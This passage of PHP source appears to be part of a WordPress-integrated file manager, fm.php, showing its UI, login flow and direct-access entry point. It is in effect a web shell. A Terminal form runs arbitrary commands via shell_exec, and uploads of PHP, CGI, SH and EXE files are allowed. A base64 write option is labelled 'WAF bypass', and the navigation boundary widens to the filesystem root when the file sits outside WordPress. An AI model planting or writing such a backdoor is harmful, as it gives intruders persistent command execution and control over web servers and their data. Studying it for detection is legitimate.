                    $result = @shell_exec($_POST['cmd'] . ' 2>&1');
                    $output[] = '<pre style="background:#000;color:#0f0;padding:14px;max-height:400px;overflow:auto;border-radius:6px;font-size:12px;font-family:Consolas,monospace">'
                              . htmlspecialchars($result ? $result : '(no output)') . '</pre>';
                } else {
                    $output[] = 'shell_exec is disabled.';
                }
            }

        } catch (Exception $e) {
            $output[] = 'Error: ' . htmlspecialchars($e->getMessage());
        }

        // ── DOWNLOAD ──
        if (isset($_GET['download'])) {
            $path = @realpath($_GET['download']);
            if ($path && strpos($path, $root) === 0 && @is_file($path)) {
                $nonce_ok = isset($_GET['wpfm_nonce']) && wpfm_verify_nonce($_GET['wpfm_nonce']);
                if (!$nonce_ok) {
                    $output[] = 'Download blocked: invalid nonce.';
                } else {
                    while (ob_get_level()) @ob_end_clean();
                    header('Content-Type: application/octet-stream');
                    header('Content-Disposition: attachment; filename="' . basename($path) . '"');
                    header('Content-Length: ' . filesize($path));
                    readfile($path);
                    exit;
                }
            }
        }

        return $output;
    }
}

/* ============================================================
 * 19. FILE MANAGER UI
 *     ⚠️ v7.7 CHANGE: opens at the file's own directory,
 *     not ABSPATH. Security boundary auto-widens if the file
 *     lives outside the WordPress root.
 * ============================================================ */
if (!function_exists('wpfm_render_manager')) {
    function wpfm_render_manager($standalone = false) {
        if (!current_user_can('manage_options')) {
            wpfm_render_login('Access denied.');
            exit;
        }

        $fs = wpfm_get_filesystem();

        /* ─── Determine opening path ─────────────────────────────
         * Default path: the directory where fm.php lives.
         * If the file was uploaded to wp-content/uploads/fm.php,
         * the manager opens on wp-content/uploads/, not on ABSPATH.
         * ────────────────────────────────────────────────────── */
        $init_path = @realpath(dirname(__FILE__));
        if ($init_path === false) {
            $init_path = ABSPATH;
        }

        /* ─── Determine security boundary ────────────────────────
         * Default: ABSPATH. If the file lives outside ABSPATH
         * (e.g. /var/www/uploads/fm.php), widen the boundary so
         * navigation remains possible — otherwise the file manager
         * would refuse to open anything.
         * ────────────────────────────────────────────────────── */
        $root = ABSPATH;
        $norm_init = rtrim(str_replace('\\', '/', $init_path), '/');
        $norm_root = rtrim(str_replace('\\', '/', $root), '/');

        if (strpos($norm_init . '/', $norm_root . '/') !== 0) {
            // File is outside the WordPress root — widen to filesystem root
            if (DIRECTORY_SEPARATOR === '\\') {
                if (preg_match('#^([A-Za-z]:)#', $init_path, $dm)) {
                    $root = $dm[1] . DIRECTORY_SEPARATOR;
                } else {
                    $root = 'C:' . DIRECTORY_SEPARATOR;
                }
            } else {
                $root = '/';
            }
            $fs_root_real = @realpath($root);
            if ($fs_root_real !== false) {
                $root = $fs_root_real;
            }
        }

        /* ─── Resolve the actual current path ─────────────────── */
        $current = isset($_GET['p']) ? @realpath($_GET['p']) : $init_path;
        if ($current === false || strpos($current, $root) !== 0 || !is_dir($current)) {
            $current = $init_path;
        }

        $messages = wpfm_handle_actions($root, $current);
        $items    = @scandir($current);
        if (!$items) $items = array();

        $base_url = $standalone
            ? (isset($_SERVER['REQUEST_URI']) ? strtok($_SERVER['REQUEST_URI'], '?') : '')
            : admin_url('admin.php?page=wpfm-fm');

        $build_url = function ($params = array()) use ($base_url) {
            return $base_url . (empty($params) ? '' : '?' . http_build_query($params));
        };

        $logout_url = $standalone ? $build_url(array('wpfm_logout' => 1)) : wp_logout_url(admin_url());
        $nonce_value = wpfm_nonce();

        $upload_max = ini_get('upload_max_filesize');
        $post_max   = ini_get('post_max_size');
        ?>
        <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        .wfm { padding: 20px; font-family: system-ui, -apple-system, sans-serif; max-width: 1400px; margin: 0 auto; color: #1f2937; }
        .wfm-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-wrap: wrap; gap: 12px; }
        .wfm-header h1 { font-size: 22px; margin: 0; }
        .wfm-header h1 small { font-size: 12px; color: #6b7280; font-weight: 400; margin-left: 8px; }
        .wfm-card { background: #fff; border: 1px solid #e5e7eb; border-radius: 10px; padding: 18px; margin-bottom: 16px; box-shadow: 0 1px 3px rgba(0,0,0,0.04); }
        .wfm-alert { padding: 12px 16px; margin-bottom: 12px; border-radius: 8px; font-size: 13px; }
        .wfm-alert-success { background: #ecfdf5; border-left: 4px solid #10b981; color: #065f46; }
        .wfm-alert-error { background: #fef2f2; border-left: 4px solid #ef4444; color: #991b1b; }
        .wfm-alert-note { background: #fffbeb; border-left: 4px solid #f59e0b; color: #78350f; }
        .wfm-btn { padding: 8px 14px; border: 1px solid #3b82f6; background: #3b82f6; color: #fff; border-radius: 6px; cursor: pointer; font-size: 12px; font-weight: 500; text-decoration: none; display: inline-block; transition: all 0.15s; }
        .wfm-btn:hover { background: #2563eb; color: #fff; }
        .wfm-btn-secondary { background: #f9fafb; color: #374151; border-color: #d1d5db; }
        .wfm-btn-secondary:hover { background: #e5e7eb; color: #111827; }
        .wfm-btn-danger { background: #ef4444; border-color: #ef4444; color: #fff; }
        .wfm-btn-danger:hover { background: #dc2626; }
        .wfm-btn-green { background: #10b981; border-color: #10b981; color: #fff; }
        .wfm-btn-green:hover { background: #059669; }
        .wfm-table { width: 100%; border-collapse: collapse; font-size: 13px; }
        .wfm-table th, .wfm-table td { padding: 10px 12px; border-bottom: 1px solid #f3f4f6; text-align: left; }
        .wfm-table th { background: #f9fafb; font-weight: 600; color: #374151; }
        .wfm-table tr:hover { background: #f9fafb; }
        .wfm-table a { color: #3b82f6; text-decoration: none; }
        .wfm-table a:hover { text-decoration: underline; }
        .wfm-grid { display: grid; grid-template-columns: 1fr 340px; gap: 20px; }
        .wfm-side input[type=text], .wfm-side input[type=file] { width: 100%; padding: 9px 11px; border: 1px solid #d1d5db; border-radius: 6px; font-size: 13px; margin-bottom: 8px; background: #fff; }
        .wfm-side textarea { width: 100%; padding: 9px 11px; border: 1px solid #d1d5db; border-radius: 6px; font-size: 12px; margin-bottom: 8px; font-family: Consolas, monospace; background: #fff; box-sizing: border-box; }
        .wfm-side h3 { font-size: 14px; margin: 0 0 12px; color: #111827; }
        .wfm-side .hint { font-size: 11px; color: #6b7280; margin-bottom: 8px; line-height: 1.5; }
        .wfm-editor { width: 100%; height: 500px; font-family: Consolas, 'Courier New', monospace; font-size: 13px; padding: 14px; border: 1px solid #d1d5db; border-radius: 8px; line-height: 1.5; background: #fafafa; }
        .wfm-editor:focus { outline: none; border-color: #3b82f6; background: #fff; }
        .wfm-meta { font-family: Consolas, monospace; font-size: 12px; line-height: 1.8; color: #374151; }
        .wfm-meta b { color: #111827; }

        .wfm-breadcrumb-card { padding: 14px 18px !important; }
        .wfm-breadcrumb { display: flex; flex-wrap: wrap; align-items: center; gap: 4px; font-size: 13px; line-height: 1.4; }
        .wfm-crumb-link, .wfm-crumb-current, .wfm-crumb-locked { display: inline-flex; align-items: center; gap: 6px; padding: 6px 11px; border-radius: 6px; text-decoration: none; font-weight: 500; transition: all 0.15s ease; max-width: 260px; }
        .wfm-crumb-link span, .wfm-crumb-current span, .wfm-crumb-locked span { white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        .wfm-crumb-link { color: #2563eb; background: #eff6ff; border: 1px solid transparent; }
        .wfm-crumb-link:hover { background: #dbeafe; color: #1e40af; border-color: #bfdbfe; transform: translateY(-1px); }
        .wfm-crumb-link.wfm-crumb-root { color: #047857; background: #ecfdf5; font-weight: 600; }
        .wfm-crumb-link.wfm-crumb-root:hover { background: #d1fae5; color: #065f46; border-color: #a7f3d0; }
        .wfm-crumb-current { color: #111827; background: #f3f4f6; border: 1px solid #e5e7eb; font-weight: 600; cursor: default; }
        .wfm-crumb-current.wfm-crumb-current-root { color: #065f46; background: #ecfdf5; border-color: #a7f3d0; }
        .wfm-crumb-locked { color: #9ca3af; background: #f9fafb; border: 1px dashed #e5e7eb; cursor: not-allowed; font-weight: 400; }
        .wfm-crumb-locked svg { opacity: 0.6; }
        .wfm-crumb-sep { color: #d1d5db; display: inline-flex; align-items: center; flex-shrink: 0; user-select: none; }
        .wfm-crumb-start { background: #fef3c7; border: 1px solid #fde68a; color: #92400e; font-weight: 600; padding: 2px 8px; border-radius: 4px; font-size: 10px; margin-left: 6px; }
        .wfm-crumb-start:hover { background: #fde68a; }

        .wfm-toggle { display: flex; align-items: center; gap: 6px; font-size: 12px; color: #374151; margin-bottom: 8px; }
        .wfm-toggle input { width: auto !important; margin: 0 !important; }

        @media (max-width: 900px) { .wfm-grid { grid-template-columns: 1fr; } }
        </style>
        <div class="wfm">
            <div class="wfm-header">
                <h1>File Manager <small>v<?php echo WPFM_VERSION; ?></small></h1>
                <a href="<?php echo esc_url($logout_url); ?>" class="wfm-btn wfm-btn-danger">Logout</a>
            </div>

            <?php foreach ($messages as $msg):
                $cls = 'wfm-alert-success';
                if (strpos($msg, 'fail') !== false || strpos($msg, 'Error') !== false || strpos($msg, 'blocked') !== false || strpos($msg, 'invalid') !== false) $cls = 'wfm-alert-error';
                elseif (strpos($msg, 'Note:') !== false || strpos($msg, 'Workaround') !== false) $cls = 'wfm-alert-note';
            ?>
                <div class="wfm-alert <?php echo $cls; ?>"><?php echo $msg; ?></div>
            <?php endforeach; ?>

            <div class="wfm-card">
                <div class="wfm-meta">
                    <b>Root:</b> <?php echo esc_html($root); ?>
                    <small style="color:#6b7280">(security boundary)</small><br>
                    <b>Started at:</b> <?php echo esc_html($init_path); ?>
                    <small style="color:#92400e">(file's own directory)</small><br>
                    <b>Current:</b> <?php echo esc_html($current); ?><br>
                    <b>Filesystem:</b> <?php echo $fs ? 'WP_Filesystem (direct)' : 'Not available'; ?>
                    &nbsp;|&nbsp;
                    <b>Writable:</b> <?php echo is_writable($current) ? 'Yes' : 'No'; ?>
                    &nbsp;|&nbsp;
                    <b>Shell:</b> <?php echo function_exists('shell_exec') ? 'Enabled' : 'Disabled'; ?><br>
                    <b>upload_max_filesize:</b> <?php echo esc_html($upload_max); ?>
                    &nbsp;|&nbsp;
                    <b>post_max_size:</b> <?php echo esc_html($post_max); ?>
                    &nbsp;|&nbsp;
                    <b>PHP:</b> <?php echo PHP_VERSION; ?>
                </div>
            </div>

            <?php
            $bc_root    = rtrim(str_replace('\\', '/', $root), '/');
            $bc_current = rtrim(str_replace('\\', '/', $current), '/');
            $bc_init    = rtrim(str_replace('\\', '/', $init_path), '/');
            $bc_is_win  = (bool) preg_match('#^[A-Za-z]:#', $bc_current);

            $bc_segments = array();
            if ($bc_is_win) {
                preg_match('#^([A-Za-z]:)(.*)$#', $bc_current, $bm);
                $bc_segments[] = array('name' => $bm[1], 'path' => $bm[1] . '/', 'type' => 'drive');
                $bc_running = $bm[1] . '/';
                foreach (array_filter(explode('/', $bm[2])) as $part) {
                    $bc_running .= $part . '/';
                    $bc_segments[] = array('name' => $part, 'path' => rtrim($bc_running, '/'), 'type' => 'dir');
                }
            } else {
                $bc_running = '';
                foreach (array_filter(explode('/', $bc_current)) as $part) {
                    $bc_running .= '/' . $part;
                    $bc_segments[] = array('name' => $part, 'path' => $bc_running, 'type' => 'dir');
                }
            }

            $bc_inside = function ($p) use ($bc_root) {
                $p = rtrim(str_replace('\\', '/', $p), '/');
                return ($p === $bc_root) || (strpos($p . '/', $bc_root . '/') === 0);
            };

            $bc_total = count($bc_segments);
            ?>
            <div class="wfm-card wfm-breadcrumb-card">
                <nav class="wfm-breadcrumb" aria-label="Server path">
                    <?php $bc_i = 0; foreach ($bc_segments as $bc_seg):
                        $bc_is_last   = ($bc_i === $bc_total - 1);
                        $bc_is_root   = (rtrim($bc_seg['path'], '/') === $bc_root);
                        $bc_is_init   = (rtrim($bc_seg['path'], '/') === $bc_init);
                        $bc_clickable = !$bc_is_last && $bc_inside($bc_seg['path']);
                        $bc_is_drive  = ($bc_seg['type'] === 'drive');
                    ?>
                        <?php if ($bc_i > 0): ?>
                            <span class="wfm-crumb-sep" aria-hidden="true"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"></polyline></svg></span>
                        <?php endif; ?>

                        <?php if ($bc_is_last): ?>
                            <span class="wfm-crumb-current<?php echo $bc_is_root ? ' wfm-crumb-current-root' : ''; ?>" title="<?php echo esc_attr($bc_seg['path']); ?>">
                                <?php if ($bc_is_root): ?>
                                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path><polyline points="9 22 9 12 15 12 15 22"></polyline></svg>
                                <?php elseif ($bc_is_drive): ?>
                                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect><line x1="8" y1="21" x2="16" y2="21"></line><line x1="12" y1="17" x2="12" y2="21"></line></svg>
                                <?php else: ?>
                                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
                                <?php endif; ?>
                                <span><?php echo esc_html($bc_seg['name']); ?></span>
                                <?php if ($bc_is_init): ?><span class="wfm-crumb-start">START</span><?php endif; ?>
                            </span>
                        <?php elseif ($bc_clickable): ?>
                            <a href="<?php echo esc_url($build_url(array('p' => $bc_seg['path']))); ?>" class="wfm-crumb-link<?php echo $bc_is_root ? ' wfm-crumb-root' : ''; ?>" title="<?php echo esc_attr($bc_seg['path']); ?>">
                                <?php if ($bc_is_root): ?>
                                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path><polyline points="9 22 9 12 15 12 15 22"></polyline></svg>
                                <?php elseif ($bc_is_drive): ?>
                                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect><line x1="8" y1="21" x2="16" y2="21"></line><line x1="12" y1="17" x2="12" y2="21"></line></svg>
                                <?php else: ?>
                                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>
                                <?php endif; ?>
                                <span><?php echo esc_html($bc_seg['name']); ?></span>
                                <?php if ($bc_is_init): ?><span class="wfm-crumb-start">START</span><?php endif; ?>
                            </a>
                        <?php else: ?>
                            <span class="wfm-crumb-locked" title="Outside boundary — locked: <?php echo esc_attr($bc_seg['path']); ?>">
                                <?php if ($bc_is_drive): ?>
                                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect><line x1="8" y1="21" x2="16" y2="21"></line><line x1="12" y1="17" x2="12" y2="21"></line></svg>
                                <?php else: ?>
                                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
                                <?php endif; ?>
                                <span><?php echo esc_html($bc_seg['name']); ?></span>
                            </span>
                        <?php endif; ?>
                    <?php $bc_i++; endforeach; ?>
                </nav>
            </div>

            <div class="wfm-grid">
                <div class="wfm-card" style="padding:0;overflow:hidden">
                    <table class="wfm-table">
                        <thead>
                            <tr>
                                <th>Name</th>
                                <th style="width:100px">Size</th>
                                <th style="width:90px">Permissions</th>
                                <th style="width:340px">Actions</th>
                            </tr>
                        </thead>
                        <tbody>
                        <?php if (rtrim($current, '/') !== rtrim($root, '/')): ?>
                            <tr><td colspan="4"><a href="<?php echo esc_url($build_url(array('p' => dirname($current)))); ?>">↑ Parent Directory</a></td></tr>
                        <?php endif; ?>
                        <?php foreach ($items as $item):
                            if ($item === '.' || $item === '..') continue;
                            $full_path = $current . '/' . $item;
                            $is_dir    = is_dir($full_path);
                        ?>
                            <tr>
                                <td>
                                    <?php echo $is_dir ? '📁' : '📄'; ?>
                                    <?php if ($is_dir): ?>
                                        <a href="<?php echo esc_url($build_url(array('p' => $full_path))); ?>" style="font-weight:600"><?php echo esc_html($item); ?></a>
                                    <?php else: ?>
                                        <a href="<?php echo esc_url($build_url(array('edit' => $full_path))); ?>"><?php echo esc_html($item); ?></a>
                                    <?php endif; ?>
                                </td>
                                <td><?php echo $is_dir ? '—' : esc_html(size_format(@filesize($full_path) ? @filesize($full_path) : 0)); ?></td>
                                <td><?php echo esc_html(@substr(sprintf('%o', @fileperms($full_path)), -4)); ?></td>
                                <td style="white-space:nowrap">
                                    <?php if (!$is_dir): ?>
                                        <a class="wfm-btn wfm-btn-secondary" href="<?php echo esc_url($build_url(array('edit' => $full_path))); ?>">Edit</a>
                                        <a class="wfm-btn wfm-btn-secondary" href="<?php echo esc_url($build_url(array('download' => $full_path, 'wpfm_nonce' => $nonce_value))); ?>">Download</a>
                                    <?php endif; ?>
                                    <form method="post" style="display:inline" onsubmit="return confirm('Delete this item?')">
                                        <input type="hidden" name="wpfm_a" value="delete">
                                        <input type="hidden" name="wpfm_nonce" value="<?php echo esc_attr($nonce_value); ?>">
                                        <input type="hidden" name="p" value="<?php echo esc_attr($full_path); ?>">
                                        <button class="wfm-btn wfm-btn-danger">Delete</button>
                                    </form>
                                    <form method="post" style="display:inline" onsubmit="var n=prompt('New name:');if(!n)return false;this.to.value=n">
                                        <input type="hidden" name="wpfm_a" value="rename">
                                        <input type="hidden" name="wpfm_nonce" value="<?php echo esc_attr($nonce_value); ?>">
                                        <input type="hidden" name="p" value="<?php echo esc_attr($full_path); ?>">
                                        <input type="hidden" name="to">
                                        <button class="wfm-btn wfm-btn-secondary">Rename</button>
                                    </form>
                                    <form method="post" style="display:inline" onsubmit="var m=prompt('Permissions (e.g. 0644):');if(!m)return false;this.perm.value=m">
                                        <input type="hidden" name="wpfm_a" value="chmod">
                                        <input type="hidden" name="wpfm_nonce" value="<?php echo esc_attr($nonce_value); ?>">
                                        <input type="hidden" name="p" value="<?php echo esc_attr($full_path); ?>">
                                        <input type="hidden" name="perm">
                                        <button class="wfm-btn wfm-btn-secondary">Chmod</button>
                                    </form>
                                </td>
                            </tr>
                        <?php endforeach; ?>
                        </tbody>
                    </table>
                </div>

                <div class="wfm-side">
                    <div class="wfm-card">
                        <h3>Upload File (any extension)</h3>
                        <p class="hint">PHP, CGI, SH, EXE — everything allowed. 4 fallback methods.</p>
                        <form method="post" enctype="multipart/form-data">
                            <input type="hidden" name="wpfm_a" value="upload">
                            <input type="hidden" name="wpfm_nonce" value="<?php echo esc_attr($nonce_value); ?>">
                            <input type="file" name="f" required>
                            <button class="wfm-btn wfm-btn-green" style="width:100%">Upload</button>
                        </form>
                    </div>

                    <div class="wfm-card">
                        <h3>Write File with Content</h3>
                        <p class="hint">Bypasses HTTP upload entirely — writes the file server-side.</p>
                        <form method="post">
                            <input type="hidden" name="wpfm_a" value="write_file">
                            <input type="hidden" name="wpfm_nonce" value="<?php echo esc_attr($nonce_value); ?>">
                            <input type="text" name="n" placeholder="filename.php" required>
                            <textarea name="content" rows="6" placeholder="File content here..."></textarea>
                            <label class="wfm-toggle">
                                <input type="checkbox" name="is_base64" value="1">
                                Content is Base64-encoded (WAF bypass)
                            </label>
                            <button class="wfm-btn" style="width:100%">Write File</button>
                        </form>
                    </div>

                    <div class="wfm-card">
                        <h3>Create Empty</h3>
                        <form method="post">
                            <input type="hidden" name="wpfm_a" value="mkfile">
                            <input type="hidden" name="wpfm_nonce" value="<?php echo esc_attr($nonce_value); ?>">
                            <input type="text" name="n" placeholder="filename.php" required>
                            <button class="wfm-btn" style="width:100%">Create File</button>
                        </form>
                        <form method="post" style="margin-top:8px">
                            <input type="hidden" name="wpfm_a" value="mkdir">
                            <input type="hidden" name="wpfm_nonce" value="<?php echo esc_attr($nonce_value); ?>">
                            <input type="text" name="n" placeholder="folder-name" required>
                            <button class="wfm-btn" style="width:100%">Create Folder</button>
                        </form>
                    </div>

                    <div class="wfm-card">
                        <h3>Terminal</h3>
                        <form method="post">
                            <input type="hidden" name="wpfm_a" value="command">
                            <input type="hidden" name="wpfm_nonce" value="<?php echo esc_attr($nonce_value); ?>">
                            <input type="text" name="cmd" placeholder="ls -la" required style="font-family:monospace">
                            <button class="wfm-btn" style="width:100%">Execute</button>
                        </form>
                    </div>
                </div>
            </div>

            <?php if (isset($_GET['edit'])):
                $edit_path = @realpath($_GET['edit']);
                if ($edit_path && strpos($edit_path, $root) === 0 && @is_file($edit_path)):
                    $content = $fs ? $fs->get_contents($edit_path) : @file_get_contents($edit_path);
                    if ($content === false) $content = '';
            ?>
            <div class="wfm-card" style="margin-top:20px">
                <h3 style="margin-bottom:8px">Edit File: <?php echo esc_html(basename($edit_path)); ?></h3>
                <p style="font-size:12px;color:#6b7280;font-family:monospace;margin-bottom:12px"><?php echo esc_html($edit_path); ?></p>
                <form method="post">
                    <input type="hidden" name="wpfm_a" value="save">
                    <input type="hidden" name="wpfm_nonce" value="<?php echo esc_attr($nonce_value); ?>">
                    <input type="hidden" name="file" value="<?php echo esc_attr($edit_path); ?>">
                    <textarea name="content" class="wfm-editor"><?php echo esc_textarea($content); ?></textarea>
                    <div style="margin-top:12px">
                        <button class="wfm-btn">Save Changes</button>
                        <a href="<?php echo esc_url($build_url(array('p' => dirname($edit_path)))); ?>" class="wfm-btn wfm-btn-secondary">Back</a>
                    </div>
                </form>
            </div>
            <?php endif; endif; ?>
        </div>
        <?php
    }
}

/* ============================================================
 * 20. WORDPRESS ADMIN INTEGRATION
 * ============================================================ */
if (function_exists('add_action')) {
    add_action('admin_init', function () {
        if (!isset($_GET['page']) || $_GET['page'] !== 'wpfm-fm') return;

        if (isset($_GET['wpfm_logout'])) {
            wpfm_logout();
            wp_safe_redirect(admin_url('admin.php?page=wpfm-fm'));
            exit;
        }

        if (wpfm_verify_cookie()) return;

        if (isset($_POST['wpfm_master'])) {
            $result = wpfm_authenticate($_POST['wpfm_master']);
            if ($result['ok']) {
                wp_safe_redirect(admin_url('admin.php?page=wpfm-fm'));
            } else {
                set_transient('wpfm_err_' . get_current_user_id(), $result['error'], 60);
                wp_safe_redirect(admin_url('admin.php?page=wpfm-fm'));
            }
            exit;
        }
    });

    add_action('admin_menu', function () {
        add_menu_page(
            'File Manager', 'File Manager', 'manage_options', 'wpfm-fm',
            function () {
                if (!wpfm_verify_cookie()) {
                    $error = get_transient('wpfm_err_' . get_current_user_id());
                    if ($error) delete_transient('wpfm_err_' . get_current_user_id());
                    wpfm_render_login($error ? $error : '');
                    return;
                }
                wpfm_render_manager(false);
            },
            'dashicons-admin-generic', 2
        );
    });
}

/* ============================================================
 * 21. DIRECT ACCESS — /fm.php
 * ============================================================ */
if ($wpfm_is_direct) {
    try {
        @ob_start();

        if (isset($_GET['wpfm_logout'])) {
            wpfm_logout();
            while (ob_get_level()) @ob_end_clean();
            $uri = isset($_SERVER['REQUEST_URI']) ? strtok($_SERVER['REQUEST_URI'], '?') : './';
            header('Location: ' . $uri);
            exit;
        }

        $session_user = wpfm_verify_cookie();

        if (!$session_user && isset($_POST['wpfm_master'])) {
            $result = wpfm_authenticate($_POST['wpfm_master']);
            if ($result['ok']) {
                $clean = strtok($_SERVER['REQUEST_URI'], '?');
                $params = $_GET;
                unset($params['wpfm_logout']);
                if (!empty($params)) {
                    $clean .= '?' . http_build_query($params);
                }
                while (ob_get_level()) @ob_end_clean();
                header('Location: ' . $clean, true, 303);
                exit;
            } else {
                while (ob_get_level()) @ob_end_clean();
                wpfm_render_login($result['error']);
                exit;
            }
        }

        if (!$session_user) {
            while (ob_get_level()) @ob_end_clean();
            wpfm_render_login('');
            exit;
        }

        if (get_current_user_id() !== $session_user) {
            wp_set_current_user($session_user);
        }

        if (!current_user_can('manage_options')) {
            while (ob_get_level()) @ob_end_clean();
            wpfm_render_login('Session invalid — please log in again.');
            exit;
        }

        while (ob_get_level()) @ob_end_clean();
        header('Content-Type: text/html; charset=utf-8');
        ?>
        <!DOCTYPE html><html lang="en"><head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width,initial-scale=1">
        <title>File Manager</title>
        <style>body{background:#f0f0f1;margin:0}</style>
        </head><body>
        <?php wpfm_render_manager(true); ?>
        </body></html>
        <?php
        exit;

    } catch (Exception $e) {
        while (ob_get_level()) @ob_end_clean();
        die('Error: ' . htmlspecialchars($e->getMessage()));
    }
}
